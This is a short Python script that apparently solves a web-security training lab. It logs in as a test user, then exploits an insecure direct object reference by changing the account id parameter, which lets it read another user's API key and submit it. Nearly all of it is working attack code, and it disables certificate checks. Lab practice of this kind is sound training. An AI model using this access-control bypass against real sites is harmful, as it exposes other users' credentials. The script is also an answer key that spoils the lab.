import sys
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def csrf_token(session,url_login):
   response=session.get(url_login,verify=False)
   response=response.text
   soup=BeautifulSoup(response,"html.parser")
   csrf=soup.find('input',{"name":"csrf"})["value"]
   return csrf
   
   
def carlos_api(session,url_carlos):
    response=session.get(url_carlos,verify=False,allow_redirects=False)
    response=response.text
    api=re.findall("Your API Key is: (.*)</div>",response)[0]
    print('(+) APi key Found .')
    return api
    

def submite_key(session,api_key,url_submit):
    data={"answer":api_key}
    response=session.post(url_submit,data=data,verify=False)
    response=response.text
    if "true" in response:
        print("(+) Api Key Submited seccessfully .")
        print("(+) Congratulations, you solved the lab!")
    else:
        print("Error while Trying to submite key")
       

def get_key(session,url):
   
   # log in to acount 
    url_login=url+"/login"
   # get csrf token first
    CSRF=csrf_token(session,url_login)

    data={"csrf":CSRF,"username":"wiener","password":"peter"}
    response=session.post(url_login,data=data,verify=False)
    response=response.text
    if "Log out" in response:
        print("(+) Log in successfully .")

        # get API KEY CARLOS
        url_carlos=url+"/my-account?id=carlos"
        api_key=carlos_api(session,url_carlos)
        # submite api key 
        url_submit=url+"/submitSolution"
        submite_key(session,api_key,url_submit)

        

    else:
       print('(-) Error while trying to Log in')
       print(response)
      



def main():
    if len(sys.argv) !=2:
      print("(+) Usage %s <url> "%sys.argv[0])
      print('(+) Example %s www.site.com'%sys.argv[0])
      sys.exit(0)
    
    session=requests.session()
    url=sys.argv[1]

    get_key(session,url)







if __name__ == '__main__':
    main()